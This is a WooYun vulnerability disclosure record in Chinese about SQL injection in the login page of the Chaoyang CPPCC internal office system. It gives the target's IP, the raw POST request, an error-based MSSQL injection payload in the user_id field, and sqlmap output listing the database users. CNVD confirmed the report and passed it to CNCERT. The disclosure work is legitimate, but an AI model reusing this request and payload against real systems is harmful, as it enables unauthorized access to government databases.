wybug_title: 朝阳政协内部办公系统注入
wybug_corp: 朝阳政协内部办公系统
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2015-04-23：	细节已通知厂商并且等待厂商处理中									2015-04-27：	厂商已经确认，细节仅向厂商公开									2015-05-07：	细节向核心白帽子及相关领域专家公开									2015-05-17：	细节向普通白帽子公开									2015-05-27：	细节向实习白帽子公开									2015-06-11：	细节向公众公开  简要描述： 朝阳政协内部办公系统注入 详细说明：  http://202.108.124.146/login.asp存在post 注入POST /login.asp HTTP/1.1Host: 202.108.124.146Proxy-Connection: keep-aliveContent-Length: 42Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://202.108.124.146User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://202.108.124.146/login.aspAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8Cookie: ASPSESSIONIDASTSTSTR=HKCNEDJAOHPJKJIDFKMHCICGuser_id=a&user_pwd=a&b1=%B5%C7%C2%BC   漏洞证明：      sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:06:32[00:06:32] [INFO] parsing HTTP request from 'pp.txt'[00:06:32] [INFO] resuming back-end DBMS 'microsoft sql server'[00:06:32] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: user_id    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user_id=a' AND 3147=CONVERT(INT,(SELECT CHAR(113)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(113)+(SELECT (CASE WHEN (3147=3147) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(121)+CHAR(118)+CHAR(113))) AND 'CqSL'='CqSL&user_pwd=a&b1=%B5%C7%C2%BC---[00:06:32] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: Apacheback-end DBMS: Microsoft SQL Server 2000[00:06:32] [INFO] fetching database users[00:06:34] [INFO] heuristics detected web page charset 'GB2312'[00:06:34] [INFO] the SQL query used returns 3 entries[00:06:34] [INFO] retrieved: sa[00:06:35] [INFO] retrieved: zxoadatabase management system users [3]:[*] sa[*] zxoa[00:06:35] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 3 times   修复方案：  。。。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-27 09:23 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向国家中心上报，由其后续协调网站管理单位处置。 最新状态： 暂无
